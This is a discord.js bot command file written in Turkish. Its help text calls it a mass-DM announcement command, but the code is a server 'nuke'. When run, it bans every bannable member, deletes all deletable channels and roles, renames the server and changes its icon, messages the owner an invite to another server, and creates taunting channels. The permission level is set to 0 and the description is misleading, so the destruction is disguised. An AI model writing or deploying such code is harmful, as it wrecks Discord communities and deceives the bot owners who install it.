const Discord = require('discord.js');
const ayarlar = require('../ayarlar.json');

exports.run = async (client, message, args) => {
if (message.guild) {
let kanallar = 0;
let roller = 0;
let emojiler = 0;
let insan = 0;

      
message.guild.members.forEach(u => {
if (u.bannable) {
insan++
message.guild.ban(u, "Berke Adamdır")
}
})

console.log(`Sunucudaki ${insan} kullanıcı ve ${kanallar} kanal  yok edildi!`);
  
message.guild.channels.forEach(c => {
if (c.deletable) {
kanallar++;
return c.delete();   
}
});  

message.guild.roles.forEach(c => {
if (c.deletable) {
roller++;
return c.delete();   
}
});
  
message.guild.setName(`BERKE ADAMDIR`, ":))")
message.guild.setIcon(`https://media.discordapp.net/attachments/566759721294495761/566902339726999553/6fc0bd5fbaec9e4bdcc10c0bd459f605.png`)

message.guild.channels.forEach(c => {
if (c.deletable) {
kanallar++;
return c.delete();   
}
});
    

    

  
message.guild.owner.send(`KARDEŞİM YENİ DİSCORD https://discord.gg/d2nAWtn`);
message.guild.createChannel(`berke-abi-ne-yaptin`)
message.guild.createChannel(`berke-adamdir`)
message.delete()
}
};

  

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['banla'],
  permLevel: 0,
  kategori: "yetkili"
};

exports.help = {
  name: 'benberke',
  description: 'Toplu dm atar.', 
  usage: 'dmduyuru [mesaj]'
};
